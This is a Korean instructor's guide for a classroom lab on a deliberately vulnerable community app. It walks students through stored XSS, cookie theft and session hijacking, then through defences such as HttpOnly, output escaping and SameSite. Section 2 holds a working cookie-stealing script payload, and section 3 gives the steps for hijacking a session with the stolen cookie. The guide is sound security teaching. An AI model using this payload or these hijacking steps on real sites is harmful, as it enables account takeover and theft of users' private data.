# 세션/쿠키 탈취 실습 · XSS로 로그인 가로채기

> 가상 커뮤니티 **TalkSpot**(의도적으로 취약하게 만든 앱)에서 저장형 XSS로 세션 쿠키를 탈취하고,
> 그 쿠키로 다른 사람 계정에 들어가는 과정을 직접 봅니다. 마지막에 **방어법**까지 비교합니다.
>
> 🔒 모든 계정·쿠키·글은 가짜이며 메모리에만 존재합니다. 종료 시 전부 사라집니다.

## 0. 시작하기 (강사)

1. **[▶ 시작]** → 상태 **실행 중** 확인. 접속: `http://localhost:5002` (학생은 LAN 주소).
2. 화면 3개를 알아두세요:
   - 홈 `/` (로그인 + **강사 제어판: 모드 전환**)
   - 방명록 `/board` (공격이 일어나는 곳)
   - 공격자 화면 `/attacker` (탈취된 쿠키 확인 + 하이재킹)
3. 시작은 **취약 모드(⚠️ 빨강)** 상태입니다.

## 1. 쿠키가 뭔지 보기 (10분)

1. 홈에서 `teacher` 로 로그인합니다.
2. F12 → Application(또는 저장소) → Cookies 에서 `sid` 쿠키를 확인합니다.
3. 콘솔에 `document.cookie` 를 쳐봅니다. **쿠키 값이 그대로 보입니다.**
4. `/mypage` 에 가보면 비밀번호 없이도 비공개 정보가 보입니다 → "이 쿠키 = 출입증".

## 2. 실습 A — 저장형 XSS로 쿠키 탈취 (20분)

1. 방명록 `/board` 글쓰기 칸에 아래 페이로드를 붙여넣고 등록합니다:

   ```html
   <script>new Image().src='/steal?c='+encodeURIComponent(document.cookie)</script>
   ```

2. 이제 **누군가 방명록을 열기만 하면** 그 사람 브라우저에서 스크립트가 실행되어
   쿠키가 공격자에게 전송됩니다. (학생들이 각자 로그인 후 방명록을 열어보게 하세요)
3. **공격자 화면 `/attacker`** 를 새로고침하면 탈취된 쿠키들이 쌓입니다.

> 핵심: 글(데이터)에 심은 스크립트가 **그 글을 보는 모든 사람**의 브라우저에서 실행된다 = 저장형 XSS.

## 3. 실습 B — 세션 하이재킹 (10분)

1. 공격자 화면에서 탈취된 쿠키 값(`sid=...`)을 복사합니다.
2. 아래 "훔친 쿠키로 로그인하기"에 붙여넣고 실행합니다.
3. `/mypage` 로 이동하며 **피해자 계정으로 로그인된 상태**가 됩니다. 비밀번호를 한 번도 몰랐는데도요.

> 핵심: 세션 쿠키만 손에 넣으면 비밀번호 없이 그 사람 행세를 할 수 있다 = 세션 하이재킹.

## 4. 실습 C — 방어 비교 (15분)

홈의 **강사 제어판 → [안전 모드로 전환 🛡️]** 을 누르고, 다시 로그인한 뒤 같은 공격을 시도해 보세요.

| 방어 기법 | 효과 |
|---|---|
| **HttpOnly 쿠키** | JS가 `document.cookie`로 못 읽음 → XSS로 쿠키 탈취 불가 |
| **출력 인코딩(이스케이프)** | 글 속 `<script>`가 글자로 표시될 뿐 실행 안 됨 → XSS 자체 차단 |
| **SameSite 쿠키** | 다른 사이트發 요청에 쿠키 첨부 차단 |

- 안전 모드에선 같은 페이로드가 **화면에 글자로만 보이고**, `document.cookie`도 `sid`를 안 줍니다.
- 토론: "둘 중 하나만 막아도 공격이 무너진다. 그래서 방어는 겹겹이(다층 방어)."

## 5. 마무리

- 오늘 배운 흐름: **입력을 안 거름(XSS) → 쿠키 탈취 → 하이재킹.**
- 개발자의 책임: 입력 검증/출력 인코딩, HttpOnly·SameSite, 세션 만료.
- **허락 없이 실제 사이트에 XSS를 시도하면 범죄**임을 분명히 합니다.

---

### 강사 메모
- 꼬이면 홈에서 **초기화** 버튼으로 방명록·탈취기록을 비울 수 있습니다.
- 모드 전환 후에는 **다시 로그인**해야 새 쿠키 정책(HttpOnly 등)이 적용됩니다.
- 멀티 접속 시, 학생들이 방명록을 열 때마다 각자 쿠키가 공격자 화면에 쌓이는 걸 같이 보면 효과적입니다.
